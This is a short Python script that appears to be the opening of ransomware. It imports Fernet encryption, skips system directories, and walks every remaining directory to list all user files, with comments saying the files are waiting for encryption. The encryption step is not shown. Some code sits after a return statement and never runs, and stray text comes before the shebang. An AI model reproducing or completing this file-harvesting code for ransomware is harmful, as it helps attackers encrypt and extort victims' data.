here#!/bin/python3
import os
import platform
import socket
from cryptography.fernet import Fernet

def check_os():
    return platform.system()

check_os()

def loop_user_files():
    user_files = []
    user_dirs = []

    system_dirs = [
        "bin", "sbin", "etc", "lib", "boot", "dev",
        "proc", "sys", "run", "tmp", "usr", "var",
        "opt", "srv"
    ]

    # get directory user
    for list_dirs in os.listdir("/"):
        if list_dirs not in system_dirs:
            user_dirs.append("/" + list_dirs)
    print(len(user_dirs))

    # get file every directory
    for user_dir in user_dirs:
        try:
            for root, dirs, files in os.walk(user_dir):
                for file in files:
                    file_path = os.path.join(root, file)

                    if file_path not in user_files:
                        user_files.append(file_path)
#            print("[+] done append file in list")
 #           print(f"we have {len(user_files)} file wait encryption")

        except Exception as e:
            continue
    return user_files,user_dirs
    print("[+] done append file in list")
    print(f"we have {len(user_files)} file wait encryp")
loop_user_files()
